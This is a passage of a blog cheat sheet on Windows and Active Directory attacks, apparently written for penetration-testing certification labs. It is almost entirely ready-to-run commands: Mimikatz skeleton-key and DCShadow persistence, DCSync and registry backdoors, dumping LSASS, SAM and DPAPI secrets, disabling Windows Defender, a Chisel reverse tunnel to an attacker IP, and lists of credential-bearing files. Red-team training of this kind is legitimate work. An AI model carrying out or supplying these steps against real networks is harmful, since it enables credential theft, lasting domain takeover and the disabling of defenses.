<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">c:\Users\[USERNAME]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
</code></pre></div><p>Or in the startup folder, requires administrative privileges but will trigger as SYSTEM on boot <em>and</em> when any user signs on:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
</code></pre></div><h2 id="domain-persistence">Domain Persistence</h2>
<p>Must be run with DA privileges.</p>
<h3 id="mimikatz-skeleton-key-attack">Mimikatz skeleton key attack</h3>
<p>Run from DC. Enables password &ldquo;mimikatz&rdquo; for all users ðŸš©.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">privilege::debug
misc::skeleton
</code></pre></div><h3 id="grant-specific-user-dcsync-rights-with-powerview">Grant specific user DCSync rights with PowerView</h3>
<p>Gives a user of your choosing the rights to DCSync at any time. May evade detection in some setups.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Add-ObjectACL -TargetDistinguishedName <span style="color:#e6db74">&#34;dc=dollarcorp,dc=moneycorp,dc=local&#34;</span> -PrincipalSamAccountName student355 -Rights DCSync
</code></pre></div><h3 id="domain-controller-dsrm-admin">Domain Controller DSRM admin</h3>
<p>The DSRM admin is the local administrator account of the DC. Remote logon needs to be enabled first.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">New-ItemProperty <span style="color:#e6db74">&#34;HKLM:\System\CurrentControlSet\Control\Lsa\&#34;</span> -Name <span style="color:#e6db74">&#34;DsrmAdminLogonBehavior&#34;</span> -Value 2 -PropertyType DWORD
</code></pre></div><p>Now we can login remotely using the local admin hash dumped on the DC before (with <code>lsadump::sam</code>, see &lsquo;Dumping secrets with Mimikatz&rsquo; below). Use e.g. &lsquo;overpass the hash&rsquo; to get a session (see &lsquo;Mimikatz&rsquo; above).</p>
<h3 id="modifying-security-descriptors-for-remote-wmi-access">Modifying security descriptors for remote WMI access</h3>
<p>Give user WMI access to a machine, using <code>Set-RemoteWMI.ps1</code> cmdlet. Can be run to persist access to e.g. DCs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace <span style="color:#e6db74">&#39;root\cimv2&#39;</span>
</code></pre></div><p>For execution, see &lsquo;Command execution with WMI&rsquo; above.</p>
<h3 id="modifying-security-descriptors-for-powershell-remoting-access">Modifying security descriptors for PowerShell Remoting access</h3>
<p>Give user PowerShell Remoting access to a machine, using <code>Set-RemotePSRemoting.ps1</code> cmdlet. Can be run to persist access to e.g. DCs.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-RemotePSRemoting -UserName student1 -ComputerName dcorp-dc.dollarcorp.moneycorp.local
</code></pre></div><p>For execution, see &lsquo;Command execution with PowerShell Remoting&rsquo; above.</p>
<h3 id="modifying-dc-registry-security-descriptors-for-remote-hash-retrieval-using-damp">Modifying DC registry security descriptors for remote hash retrieval using DAMP</h3>
<p>Using <a href="https://github.com/HarmJ0y/DAMP">DAMP toolkit</a>, we can backdoor the DC registry to give us access on the <code>SAM</code>, <code>SYSTEM</code>, and <code>SECURITY</code> registry hives. This allows us to remotely dump DC secrets (hashes).</p>
<p>We add the backdoor using the <code>Add-RemoteRegBackdoor.ps1</code> cmdlet from DAMP.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee Student355
</code></pre></div><p>Dump secrets remotely using the <code>RemoteHashRetrieval.ps1</code> cmdlet from DAMP (run as &lsquo;Trustee&rsquo; user).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Get machine account hash for silver ticket attack</span>
Get-RemoteMachineAccountHash -ComputerName dcorp-dc

<span style="color:#75715e"># Get local account hashes</span>
Get-RemoteLocalAccountHash -ComputerName dcorp-dc

<span style="color:#75715e"># Get cached credentials (if any)</span>
Get-RemoteCachedCredential -ComputerName dcorp-dc
</code></pre></div><h3 id="dcshadow">DCShadow</h3>
<p>DCShadow is an attack that masks certain actions by temporarily imitating a Domain Controller. If you have Domain Admin or Enterprise Admin privileges in a root domain, it can be used for forest-level persistence.</p>
<p>Optionally, as Domain Admin, give a chosen user the privileges required for the DCShadow attack (uses <code>Set-DCShadowPermissions.ps1</code> cmdlet).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-DCShadowPermissions -FakeDC mcorp-student35 -SamAccountName root355user -Username student355 -Verbose
</code></pre></div><p>Then, from any machine, use Mimikatz to stage the DCShadow attack.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext"># Set SPN for user
lsadump::dcshadow /object:root355user /attribute:servicePrincipalName /value:&#34;SuperHacker/ServicePrincipalThingey&#34;

# Set SID History for user (effectively granting them Enterprise Admin rights)
lsadump::dcshadow /object:root355user /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519

# Set Full Control permissions on AdminSDHolder container for user
## Requires retrieval of current ACL:
(New-Object System.DirectoryServices.DirectoryEntry(&#34;LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local&#34;)).psbase.ObjectSecurity.sddl

## Then get target user SID:
Get-NetUser -UserName student355 | select objectsid

## Finally, add full control primitive (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for user
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45109)
</code></pre></div><p>Finally, from either a DA session OR a session as the user provided with the DCShadowPermissions before, run the DCShadow attack. Actions staged previously will be performed without leaving logs ðŸ˜ˆ</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">lsadump::dcshadow /push
</code></pre></div><h2 id="post-exploitation">Post-Exploitation</h2>
<h3 id="lsass-protection">LSASS protection</h3>
<p>Sometimes, LSASS is configured to run as a protected process (PPL). You can query this with PowerShell as follows.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-ItemProperty -Path HKLM<span style="color:#960050;background-color:#1e0010">:</span>\SYSTEM\CurrentControlSet\Control\Lsa -Name <span style="color:#e6db74">&#34;RunAsPPL&#34;</span> 
</code></pre></div><p>If this is the case, you can&rsquo;t just dump or parse LSASS, and you need to disable the protection with something like <code>mimidrv.sys</code>. I won&rsquo;t discuss how to do that here.</p>
<h3 id="dumping-secrets-with-mimikatz">Dumping secrets with Mimikatz</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext"># Dump logon passwords
sekurlsa::logonpasswords

# Dump all domain hashes from a DC
## Note: Everything with /patch is noisy as heck since it _writes_ to LSASS ðŸš©
lsadump::lsa /patch

# Dump only local users
lsadump::sam

# DCSync (requires &#39;ldap&#39; SPN)
lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local
</code></pre></div><p>Windows Credential Vault dumping</p>
<blockquote>
<p>I&rsquo;ve had some issues using this with <code>Invoke-Mimikatz.ps1</code>. Try with native Mimikatz if having issues.</p>
</blockquote>
<pre><code># Dump windows secrets, such as stored creds for scheduled tasks (elevate first)
vault::list
vault::cred /patch

# Dump windows secrets DPAPI method (less noise and no specific rights reqd yay)
## More here: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
## First, get GUID of master key for specific secret
dpapi::cred /in:C:\Users\appadmin\AppData\local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D

## EITHER Grab dpapi keys from LSASS
sekurlsa::dpapi

## OR Grab and cache a specific key
dpapi::masterkey /rpc /in:C:\Users\appadmin\AppData\Roaming\Microsoft\Protect\S-1-5-21-3965405831-1015596948-2589850225-1118\a89b97d2-b520-462d-a924-d57df68c543b

## Mimikatz will cache the master key (check with dpapi::cache)
## Then run the initial dpapi::cred command again to get the juice!
</code></pre><h3 id="dumping-secrets-without-mimikatz">Dumping secrets without Mimikatz</h3>
<p>We can also parse system secrets without using Mimikatz on the target system directly.</p>
<h4 id="dumping-lsass">Dumping LSASS</h4>
<p>The preferred way to run Mimikatz is to do it locally with a dumped copy of LSASS memory from the target. <a href="https://github.com/outflanknl/Dumpert">Dumpert</a>, <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>, or other (custom) tooling can be used to dump LSASS memory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Dump LSASS memory through a process snapshot (-r), avoiding interacting with it directly</span>
.\procdump.exe -r -ma lsass.exe lsass.dmp
</code></pre></div><p>After downloading the memory dump file on our attacking system, we can run Mimikatz and switch to &lsquo;Minidump&rsquo; mode to parse the file as follows.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">sekurlsa::minidump lsass.dmp
</code></pre></div><p>After this, we can run Mimikatz commands as usual.</p>
<h4 id="dumping-secrets-from-the-registry">Dumping secrets from the registry</h4>
<p>We can dump secrets from the registry and parse the files &ldquo;offline&rdquo; to get a list of system secrets. ðŸš©</p>
<p>On the target, we run the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">reg.exe save hklm\sam c:\users\public\downloads\sam.save
reg.exe save hklm\system c:\users\public\downloads\system.save
reg.exe save hklm\security c:\users\public\downloads\security.save
</code></pre></div><p>Then on our attacking box we can dump the secrets with Impacket:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL &gt; secrets.out
</code></pre></div><h4 id="dumping-secrets-from-a-volume-shadow-copy">Dumping secrets from a Volume Shadow Copy</h4>
<p>We can also create a &ldquo;Volume Shadow Copy&rdquo; of the <code>SAM</code> and <code>SYSTEM</code> files (which are always locked on the current system), so we can still copy them over to our local system. An elevated prompt is required for this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">wmic shadowcopy call create Volume=<span style="color:#e6db74">&#39;C:\&#39;</span>
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
</code></pre></div><h3 id="disable-defender">Disable defender</h3>
<p>ðŸ‘€ðŸš©</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Set-MpPreference -DisableRealtimeMonitoring $true

Set-MpPreference -DisableIOAVProtection $true
</code></pre></div><p>Or leave Defender enabled, and just remove the signatures from it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#e6db74">&#34;C:\Program Files\Windows Defender\MpCmdRun.exe&#34;</span> -RemoveDefinitions -All
</code></pre></div><h3 id="chisel-proxying">Chisel proxying</h3>
<p>Just an example on how to set up a Socks proxy to chisel over a compromised host. There are many more things you can do with Chisel!</p>
<p>On attacker machine (Linux or Windows):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./chisel server -p <span style="color:#ae81ff">8888</span> --reverse
</code></pre></div><p>On target:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">.\chisel_windows_386.exe client 10.10.16.7<span style="color:#960050;background-color:#1e0010">:</span>8888 R:8001<span style="color:#960050;background-color:#1e0010">:</span>127.0.0.1<span style="color:#960050;background-color:#1e0010">:</span>9001
</code></pre></div><p>Now we are listening on <code>localhost:8001</code> on our attacking machine to forward that traffic to <code>target:9001</code>.</p>
<p>Then, open the Socks server. On target:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">.\chisel_windows_386.exe server -p 9001 --socks5
</code></pre></div><p>On attacking machine:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./chisel client localhost:8001 socks
</code></pre></div><p>A proxy is now open on port 1080 of our attacking machine.</p>
<h3 id="juicy-files">Juicy files</h3>
<p>There are lots of files that may contain interesting information. Tools like <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">WinPEAS</a> or collections like <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> may help in identifying juicy files (for privesc or post-exploitation).</p>
<p>Below is a list of some files I have encountered to be of relevance. Check files based on the programs and/or services that are installed on the machine.</p>
<blockquote>
<p>In addition, don&rsquo;t forget to enumerate any local databases with <code>sqlcmd</code> or <code>Invoke-SqlCmd</code>!</p>
</blockquote>
<pre><code># All user folders
## Limit this command if there are too many files ;)
tree /f /a C:\Users

# Web.config
C:\inetpub\www\*\web.config

# Unattend files
C:\Windows\Panther\Unattend.xml

# RDP config files
C:\ProgramData\Configs\

# Powershell scripts/config files
C:\Program Files\Windows PowerShell\

# PuTTy config
C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty

# FileZilla creds
C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml

# Jenkins creds (also check out the Windows vault, see above)
C:\Program Files\Jenkins\credentials.xml

# WLAN profiles
C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml

# TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)
Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name &quot;Password&quot; | select -ExpandProperty Password
</code></pre>
            </div>
        </article>

        <hr />

        <div class="post-info">
                <p>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://casvancooten.com/tags/active-directory">Active Directory</a></span><span class="tag"><a href="https://casvancooten.com/tags/windows">Windows</a></span><span class="tag"><a href="https://casvancooten.com/tags/hacking">Hacking</a></span>
                </p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>5010 Words</p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-11-04 00:00 &#43;0000</p>
        </div>

        
            <div class="pagination">
                <div class="pagination__title">
                    <span class="pagination__title-h"></span>
                    <hr />
                </div>

                <div class="pagination__buttons">
                    
                        <span class="button previous">
                            <a href="https://casvancooten.com/posts/osepreview/">
                                <span class="button__icon">â†</span>
                                <span class="button__text">Getting the OSEP Certification: &#39;Evasion Techniques and Breaching Defenses&#39; (PEN-300) course review</span>
                            </a>
                        </span>
                    

                    
                        <span class="button next">
                            <a href="https://casvancooten.com/posts/crtpreview/">
                                <span class="button__text">Getting the CRTP Certification: &#39;Attacking and Defending Active Directory&#39; Course Review</span>
                                <span class="button__icon">â†’</span>
                            </a>
                        </span>
                    
                </div>
            </div>
        
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2021</span>
            
            <span></span>
            <span> <a href="https://casvancooten.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Theme by  <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
        </div>
    </div>

</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.4a69500057d68129e88f497d354afe68422eb56de6d15e45dbe2190858ea5a76bfcb096406f992984b241db45f47388ac57ab0376e3b32125bef7a8a6d0f06c4.js" integrity="sha512-SmlQAFfWgSnoj0l9NUr&#43;aEIutW3m0V5F2&#43;IZCFjqWna/ywlkBvmSmEskHbRfRziKxXqwN247MhJb73qKbQ8GxA=="></script>



    </body>
</html>
